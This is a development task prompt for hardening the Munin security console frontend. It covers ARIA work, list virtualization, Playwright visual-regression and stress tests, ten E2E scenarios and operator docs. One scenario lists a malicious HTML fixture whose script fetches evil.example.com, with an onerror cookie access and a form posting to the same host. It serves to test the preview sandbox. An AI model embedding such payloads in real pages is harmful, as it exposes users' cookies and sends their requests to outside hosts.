# Prompt PR-7 (Issue PR F) — Production hardening: a11y, virtualization, visual regression, E2E 10 scenarios

> Issue: #18 · PR breakdown del issue: **PR F — accessibility/performance/polish**
> **Requiere PR A + PR B + PR C + PR D + PR E mergeados en `main`.** Es la consolidación final.
> Referencia autoritativa: Issue #18 comentarios C3 §10 (Accessibility & responsive), C4 §12 (Tests), C5 §16 (Blocking test matrix), C7 condicional renderers.

---

## 1. Objetivo

Llevar la consola Munin a estándar de producción:
1. **a11y WCAG AA** completo (focus rings, ARIA roles, announcer para SSE).
2. **Virtualización** de conversation larga (5000+ eventos).
3. **Visual regression** con fixtures responsivas exactas del issue.
4. **High-volume streaming tests** (1000+ chunks, 5000+ events).
5. **10 escenarios E2E** del blocking test matrix, en Playwright.
6. **Atajos restantes**: `@` agent targeting, `/` command palette, `Cmd+Enter` submit primary.
7. **Docs operator**: `README.md` sección "Frontend AI-native console" + `docs/operator-guide.md` + `CHANGELOG.md`.

## 2. Rutas permitidas

- `app/src/hooks/useKeyboardShortcuts.ts` (EDIT — añadir `@`/`/`/`Cmd+Enter`)
- `app/src/components/CommandPalette.tsx` (NUEVO — overlay `/` command palette)
- `app/src/components/AgentTargetingMenu.tsx` (NUEVO — `@` popup)
- `app/src/components/AgentConsole.tsx` (EDIT — virtualización `@tanstack/react-virtual`)
- `app/src/components/ai-elements/conversation.tsx` (EDIT — `aria-live` region announcer)
- `app/src/components/ai-elements/message.tsx` (EDIT — ARIA roles refinados)
- `app/src/components/ai-elements/tool.tsx` (EDIT — ARIA roles en tools)
- `app/src/components/KeyboardHelpDialog.tsx` (EDIT — completo ahora con atajos adicionales)
- `app/src/app/globals.css` (EDIT — scrollbars consistentes, sr-only polish)
- `app/src/index.css` (EDIT si existe — focus-visible rings uniformes)
- `app/playwright/e2e.*.spec.ts` (NUEVO — 10 specs)
- `app/playwright/visual-regression.spec.ts` (NUEVO)
- `app/playwright/stress.spec.ts` (NUEVO)
- `app/playwright/fixtures/` (NUEVO — 5 viewport sizes)
- `CHANGELOG.md` (EDIT)
- `README.md` (EDIT)
- `docs/operator-guide.md` (EDIT)
- `changes.md` (AÑADIR entrada consolidada para issue #18 cierre)
- `app/package.json` (EDIT — añadir `@tanstack/react-virtual` y `@playwright/test` si no está)

### Rutas prohibidas
- `munin/**`
- Cualquier schema o renderer ya merged
- `app/src/lib/munin-ui/**` (PR B frozen)

## 3. a11y refinements (C3 §10)

### 3.1 ARIA roles en partes dinámicas

- `Message`: `role="article"`, `aria-label="{role} message at {timestamp}"`, `aria-live="polite"` cuando isStreaming.
- `ToolCard`: `role="region"`, `aria-label="tool {tool_name} {state}"`, `aria-busy="true"` cuando running.
- `HumanRequestCard`: `role="alertdialog"`, `aria-label="Operator decision required: {action}"`. Focus trap activo (Radix AlertDialog ya lo hace, pero verificar implementación).
- `WorkspacePane`: `role="complementary" aria-label="Context workspace"`. Tabs: `role="tablist"`, tab buttons `role="tab"` con `aria-selected`, panel `role="tabpanel"`.
- `ConversationScrollButton`: `aria-label="Jump to latest"`, hidden del screen reader cuando `!visible`.

### 3.2 `useAnnouncer` refino

PR C creó un stub. PR F completa con trick de doble-tick para screen readers:

```ts
export function useAnnouncer() {
  const ref = useRef<HTMLDivElement>(null);

  const announce = useCallback((text: string) => {
    if (!ref.current || !text) return;
    if (text.length > 200) text = text.slice(0, 197) + "...";
    // Clear first then set in next tick → screen readers re-announce
    ref.current.textContent = "";
    window.setTimeout(() => {
      if (ref.current) ref.current.textContent = text;
    }, 50);
  }, []);

  return { ref, announce };
}
```

Eventos anunciados (hooked en MuninConversation stream onData):
- `data-run-state` change → `Run {state}` (announced solo en transitions a terminal/cancelled/failed/waiting_for_human)
- `data-artifact` → `Artifact created: {title||filename}`
- `data-hitl-request` → `Operator decision required: {action}`
- `data-tool-failed` (cuando state transitions to failed) → `Tool {tool_name} failed`
- `data-guidance` state transition a `applied_to_model` → `Guidance applied at step {N}`
- `data-guidance` state transition a `run_finished_undelivered` → `Guidance undelivered`

NO announce heartbeats/common tool events/activity — demasiado noisy.

### 3.3 Focus-visible rings (uniform in `globals.css`)

```css
*:focus-visible {
  outline: 2px solid var(--accent, #7c3aed);
  outline-offset: 2px;
  border-radius: 4px;
}
*:focus:not(:focus-visible) { outline: none; }
.sr-only {
  position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
  overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
}
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.01ms !important;
    transition-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
  }
}
```

### 3.4 Icon-only controls — accessible names generously

Cada icon-only button debe tener `aria-label` y tooltip Radix. PR F escanea `ai-elements/*`, `PrimaryRail`, `WorkspacePane`, `Composer` y añade lo puntual faltante.

## 4. Atajos restantes (C3 §6)

Edit `app/src/hooks/useKeyboardShortcuts.ts`:

```ts
const SHORTCUTS = {
  "mod+k": () => focusComposerInput(),
  "mod+b": () => toggleOperationsSidebar(),
  "mod+j": () => toggleWorkspace(),
  "mod+/": () => openKeyboardHelpDialog(),
  "mod+enter": () => submitPrimaryComposerAction(),    // ← NUEVO PR F
  "shift+enter": () => insertComposerNewline(),        // ← NUEVO PR F
  "escape": () => closeTopmostDialog(),
  "@": () => openAgentTargetingMenu(),                 // ← NUEVO PR F (solo si composer focused)
  "/": () => openCommandPalette(),                     // ← NUEVO PR F (solo si composer focused)
} as const;
```

Dentro de `input`/`textarea`/`[contenteditable]`:
- Intercepts: `escape`, `mod+k`, `mod+b`, `mod+j`, `mod+enter`, `shift+enter`, `@` (only opens menu, doesn't insert), `/` (only opens palette).
- NO intercept: regular typing of `@`/`/` si el siguiente carácter cambia (optional behavior — start with intercept when at start of input or after whitespace).

### `CommandPalette.tsx`

Typeahead fuzzy search sobre commands:
- Send new message, Guide active run, Detach, Cancel run, New operation, Open run diagnostics, Open keyboard help, Open settings, Toggle sidebar, Toggle workspace.
- Keyboard: ↑/↓ navigate, Enter select, Esc close.

### `AgentTargetingMenu.tsx`

`@` abre popup con lista de subagents activos + agent profiles en registry. Select inserta `@{agent_id}` en el composer input.

## 5. Virtualización (C4 §11 Performance, §12 Tests).

`AgentConsole.tsx` → use `@tanstack/react-virtual` `useVirtualizer` con `measureElement` dinámico.

```tsx
import { useVirtualizer } from "@tanstack/react-virtual";

function VirtualizedConversation({ turns }: { turns: AssistantTurn[] }) {
  const parentRef = useRef<HTMLDivElement>(null);
  const virtualizer = useVirtualizer({
    count: turns.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 240,            // estimate, real size via measureElement
    overscan: 6,
    measureElement: (el) => el?.scrollHeight ?? 240,   // ← CRITICAL para streaming con altura variable
  });

  return (
    <div ref={parentRef} className="flex-1 overflow-y-auto min-h-0 min-w-0">
      <div style={{ height: virtualizer.getTotalSize(), position: "relative", width: "100%" }}>
        {virtualizer.getVirtualItems().map(vItem => (
          <div
            key={turns[vItem.index].id}
            data-index={vItem.index}
            ref={virtualizer.measureElement}
            style={{ position: "absolute", top: 0, transform: `translateY(${vItem.start}px)`, width: "100%" }}
          >
            <MuninTurn turn={turns[vItem.index]} />
          </div>
        ))}
      </div>
    </div>
  );
}
```

**Verificar Context7 `/tanstack/virtual` para la API exacta**:
- `measureElement` debe pasarse como `ref` callback.
- `data-index` attribute REQUIRED para que el virtualizer trackee los items correctos durante reorder.

Performance rules (C4 §11):
- Throttle cosmetic UI updates (heartbeat spinners) to ~10Hz; NO throttle durable event order.
- Memoize grouped turn view models (`groupPartsByStableId`) con `useMemo` por turn.
- Avoid persisting one DB row per token (placeholder/durable replay strategy preserved).
- Fetch artifact/content large by ID — don't embed in UIMessage.

## 6. Visual regression — fixtures exactas del issue (C3 §10)

### `app/playwright/fixtures/`
```ts
export const VIEWPORT_FIXTURES = [
  { name: "desktop-1366", width: 1366, height: 768 },
  { name: "desktop-1440", width: 1440, height: 900 },
  { name: "desktop-1920", width: 1920, height: 1080 },
  { name: "tablet-768", width: 768, height: 1024 },
  { name: "tablet-1024", width: 1024, height: 768 },
  { name: "mobile-375", width: 375, height: 667 },
  { name: "mobile-414", width: 414, height: 896 },
] as const;
```

### `app/playwright/visual-regression.spec.ts`

```ts
import { VIEWPORT_FIXTURES } from "./fixtures";

describe("Visual regression per viewport fixture", () => {
  for (const fixture of VIEWPORT_FIXTURES) {
    test(`no horizontal overflow at ${fixture.name}`, async ({ page }) => {
      await page.setViewportSize({ width: fixture.width, height: fixture.height });
      await page.goto("/");
      await page.waitForSelector("[role='article'], // munin — war-raven ready");
      const hasHScroll = await page.evaluate(() => document.body.scrollWidth > document.body.clientWidth);
      expect(hasHScroll, `fixture ${fixture.name}`).toBe(false);
    });

    test(`key layouts stable snapshot ${fixture.name}`, async ({ page }) => {
      await page.setViewportSize({ width: fixture.width, height: fixture.height });
      await page.goto("/?fixture=issue18-stress");
      await expect(page).toHaveScreenshot(`${fixture.name}.png`, { fullPage: true, maxDiffPixelRatio: 0.02 });
    });
  }
});
```

`toHaveScreenshot` de Playwright guarda baseline en `app/playwright/__screenshots__/`. Si la CI las rechaza como nueva baseline, the PR body debe incluir las nuevas como referencia.

## 7. Stress test (C4 §11 + C5 §16 E2E)

### `app/playwright/stress.spec.ts`

```ts
test("5000 command chunks same job_id → 1 terminal, no page overflow, FPS ≥ 30", async ({ page }) => {
  await page.route("**/api/chat/**/stream", async route => {
    const events = buildMockStressStream({ tool_chunks: 5000, jobs: 1 });
    await route.fulfill({ status: 200, contentType: "text/event-stream", body: events });
  });
  await page.goto("/");
  await page.waitForSelector("[role='article']");
  // FPS during scroll
  const fps = await page.evaluate(async () => {
    let frames = 0; const start = performance.now();
    return new Promise<number>(resolve => {
      const tick = () => { frames++; if (performance.now() - start < 1500) requestAnimationFrame(tick); else resolve(frames); };
      requestAnimationFrame(tick);
    });
  });
  await page.mouse.wheel(0, 50000);
  expect(fps).toBeGreaterThan(30);
  const terminalCount = await page.locator("[aria-label^='job']").count();
  expect(terminalCount).toBe(1);   // 5000 chunks → 1 terminal NO 5000
});
```

## 8. E2E 10 escenarios BLOCKING del issue (C5 §16)

Implementa UN spec por escenario:

### `app/playwright/e2e.01-detach-refresh-reconnect.spec.ts`
1. Start long run → see live output.
2. Click **Detach**.
3. Refresh page.
4. Operation visible in "Running" state in sidebar.
5. Click it → **Reconnect** via `useChat({resume:true})`.
6. Asserts final answer is consistent (same as if never refreshed).

### `app/playwright/e2e.02-long-command-live-output.spec.ts`
1. Send a turn → Munin executes a command with ~500 stdout chunks.
2. Observe live output grouped in 1 terminal.
3. Toggle **Wrap** on → horizontal scroll removed, lines soft-wrap.
4. Toggle **Wrap** off → exact terminal mode, page-level NO horizontal scrollbar.
5. Click **Copy** → clipboard contains all stdout.
6. Click **Fullscreen** → modal opens with sticky header, search, Esc closes.

### `app/playwright/e2e.03-guidance-queued-applied-proof.spec.ts`
1. Start run.
2. Send "Guide" with body "STOP if you see exfil attempts".
3. UI shows "Queued" (no "Delivered").
4. After next model boundary → UI shows "Applied" + `step N`.
5. Backend assertion: replay `run_events` (or via `/api/runs/{run_id}/detail`) and check `guidance.applied` event with `HumanMessage(name="operator", content="STOP if you see exfil attempts")`.

### `app/playwright/e2e.04-guidance-after-terminal.spec.ts`
1. Start run, wait for completion.
2. Send "Guide" → backend enqueues.
3. UI shows "Queued".
4. Since no next model boundary → UI shows "Undelivered" within seconds.
5. `/api/runs/{run_id}/detail` reflects `state:"run_finished_undelivered"`.

### `app/playwright/e2e.05-cancel-during-model-work.spec.ts`
1. Start run with model work in progress.
2. Click **Cancel** in workspace Run tab.
3. Confirm dialog.
4. UI shows `cancelling` run state from SSE stream.
5. Once `cancelled` arrives → UI shows final state.
6. Backend assertion: no later tool starts (via `run_events` filter for tool events with timestamp > cancel_requested_at_ms).

### `app/playwright/e2e.06-cancel-during-command.spec.ts`
1. Start run → execute command with ~200 stdout chunks.
2. Click **Cancel**.
3. UI shows `cancelling` + tool heartbeat stops.
4. UI shows `cancelled` final state.
5. Backend assertion: `JobManager.cancel_for_run` was called (via metrics or `/api/runs/{run_id}/detail` shows tool state `cancelled` instead of `completed`).

### `app/playwright/e2e.07-hitl-resume-checkpoint.spec.ts`
1. Start run → HITL `__interrupt__` thrown.
2. UI shows approval card with action/target/redacted args/risk/evidence.
3. Click "Approve" → Backend checkpoint resumes via `Command(resume={decisions:[choice]})`.
4. UI shows run continues → completes or continues.
5. Refresh → approval card shows "APPROVED: {choice}" inactivo (resolved state persists).

### `app/playwright/e2e.08-artifact-survives-reload.spec.ts`
1. Run generates an artifact (`ioc-table@1`).
2. Click on artifact → opens in workspace.
3. Refresh page.
4. Artifact still listed in workspace Artifacts tab.
5. Click → renders same IocTable.
6. `/artifacts/{id}` route opens in new view with same renderer.

### `app/playwright/e2e.09-malicious-html-sandbox.spec.ts`
1. Boot backend with malicious HTML fixture artifact containing:
   - `<script>fetch('https://evil.example.com')</script>`
   - `<img onerror="document.cookie" />`
   - `<form action="https://evil.example.com"><button>Submit</button></form>`
2. Open `{artifactId}` via `/artifacts/{id}` route.
3. Asserts:
   - iframe `src` = `/api/artifacts/{id}/sandbox-preview`
   - iframe `sandbox` attribute = "" (no allow-same-origin)
   - iframe `referrerPolicy` = "no-referrer"
   - Sandbox preview response has CSP `default-src 'none'`
   - Sandbox preview response has NO `Set-Cookie` header
   - Network requests panel: only to `/api/artifacts/{id}/sandbox-preview`, NO requests to `evil.example.com`
   - browser console no error from cross-origin parent access attempts (silently blocked)

### `app/playwright/e2e.10-replay-old-schema.spec.ts`
1. Backend pre-loaded with old `conversation_events` (pre-schemaVersion), e.g. {kind:"tool_output", data:{...}}.
2. Frontend loads conversation → translator.ts maps to `data-command-output`.
3. UI renders WITHOUT crash. Old artifact events with only `{artifactId, mimeType, uri}` → fallback a safe diagnostic card.
4. Unknown renderer `"my-future-renderer@9"` (invented) → fallback a safe `unknown renderer` card with diagnostic info.

## 9. Documentación operador

### `README.md` — sección nueva:

```markdown
## Frontend AI-native console

Munin ships an AI-native security operations console built with Vercel AI SDK UI v4 + AI Elements (adapted to React 18.3 / Tailwind 3.4). Four responsive zones:

- **Primary rail** (48px): Operations, Run activity, Artifacts, Agents, Settings, Notifications, Help.
- **Operations sidebar**: durable conversation list with running/waiting/cancelling/completed/failed/archived indicators.
- **Conversation + execution**: objective → activity → grouped tools/agents → approvals → artifacts → final answer (strongest visual hierarchy).
- **Context Workspace** (collapsible): Artifacts / Evidence / Run / Agents tabs with 14 generative renderers and sandboxed HTML preview.

Atajos: `Cmd+K` (composer focus), `Cmd+B` (sidebar), `Cmd+J` (workspace), `Cmd+/` (help), `@` (agent targeting), `/` (command palette), `Cmd+Enter` (submit), `Esc` (close).

Detach/Cancel son distintas: Detach closes the local viewer; Cancel stops the durable run with backend confirmation.
Guidance lifecycle es truthful: Queued → Consumed → Applied (only when reaching the next model input) → Undelivered/Failed.
HITL survives refresh via durable nonce-backed human_requests.
Generated HTML runs in a hardened sandbox: no same-origin, no auth access, no network by default.
```

### `docs/operator-guide.md` — sección "Using the console"

Añade sección con:
- Captura del live site (`docs/screenshots/issue-18-console.png` — capturar via chrome-devtools MCP en el live-session tunnel).
- Reference a las 4 zonas y a los atajos.
- Table de los 14 generative renderers (`renderer_key`, cuando aparece, qué método de fetch usa).
- Warning de OPSEC: el backend es autoritativo, la UI es visualizador. Detach/Cancel semantics, guidance lifecycle.

### `CHANGELOG.md`

Issue #18 entry:

```markdown
## Issue #18 — AI-native frontend workspace

- Four-zone responsive shell (rail + operations + conversation + workspace).
- AI Elements primitives adapted to React 18.3 / Tailwind 3.4.
- Durable operator controls: Detach (local viewer), Cancel (real backend mutation).
- Guidance lifecycle: queued → consumed_by_runtime → applied_to_model / run_finished_undelivered / expired / failed.
- Zod-validated Munin data-* parts with `schemaVersion` and forward-compat fallback.
- 14 typed allow-listed renderers (`ioc-table@1`, `cve-assessment@1`, ...).
- Sandboxed HTML preview via dedicated endpoint with strict CSP (no scripts/forms/network).
- Backend read-models: `GET /api/runs/{id}/detail`, `/api/runs/{id}/commands/{job_id}/transcript`, `/api/artifacts`, `/api/runs/{id}/evidence`, etc.
- E2E 10 scenarios: detach/cancel/guidance/HITL/artifact/malicious-HTML/replay-compat.
- Visual regression across viewport fixtures: 1366×768, 1440×900, 1920×1080, tablet, mobile.
- Accessibility: focus-visible rings, aria-live announcer, reduced motion respected.
- Virtualization for 5000+ event conversations without lag.

Closes #18. Implementation split across PR A/B/C/D/E/F (see `docs/prompts/issue-18/`).
```

### `changes.md`

Añade entrada consolidada que referencia los 6 PRs (A/B/C/D/E/F) ya merged + este PR F.

## 10. Verificación

```bash
cd app
npm install                  # por @tanstack/react-virtual si no estaba
npm run lint
npm run typecheck
npm run build
npm test
npx playwright install      # browsers
npx playwright test         # 10 E2E + visual regression + stress
python -m pytest -q         # backend no afectado
```

## 11. Commit / PR

- Branch: `feat/issue-18f-hardening`
- Commit: `feat(issue-18f): a11y, virtualization, visual regression, 10 E2E scenarios, command palette, docs`
- PR contra `main`. Requiere PR A + PR B + PR C + PR D + PR E merged.
- En el cuerpo del PR:
  - `Closes #18`
  - Lista los 6 PRs anteriores con sus números reales de PR merged.
  - Adjunta metrics del stress (FPS, count de components rendered, max memory).
  - Adjunta screenshots del visual regression como nuevos baselines.
  - Resume acceptance criteria cumplidos del issue #18 (todos los checkboxes).
